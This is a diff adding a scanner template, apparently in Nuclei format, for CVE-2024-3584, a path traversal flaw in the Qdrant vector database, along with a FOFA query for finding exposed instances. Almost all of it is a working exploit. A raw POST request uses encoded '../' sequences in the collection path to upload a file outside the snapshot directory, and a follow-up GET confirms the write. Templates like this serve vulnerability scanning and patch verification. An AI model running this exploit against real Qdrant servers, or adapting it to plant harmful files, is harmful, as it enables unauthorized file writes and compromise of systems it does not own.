@@ -1,0 +1,39 @@
+id: qdrant-vector-db-path-traversal
+info:
+  name: "Qdrant路径遍历漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="UI | Qdrant"
+        Qdrant作为支持扩展过滤功能的向量相似度搜索引擎及数据库系统，其架构设计适用于神经网络驱动的语义匹配与图像检索场景。
+  reference:
+  - CVE-2024-3584
+  tags: Qdrant
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /collections/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2froot/snapshots/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXBwNbBx9IGRc1R0C
+
+    ------WebKitFormBoundaryXBwNbBx9IGRc1R0C
+    Content-Disposition: form-data; name="file"; filename="NTest.txt"
+    Content-Type: image/png
+
+    NdayTest
+    ------WebKitFormBoundaryXBwNbBx9IGRc1R0C--
+- raw:
+  - |
+    GET /NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
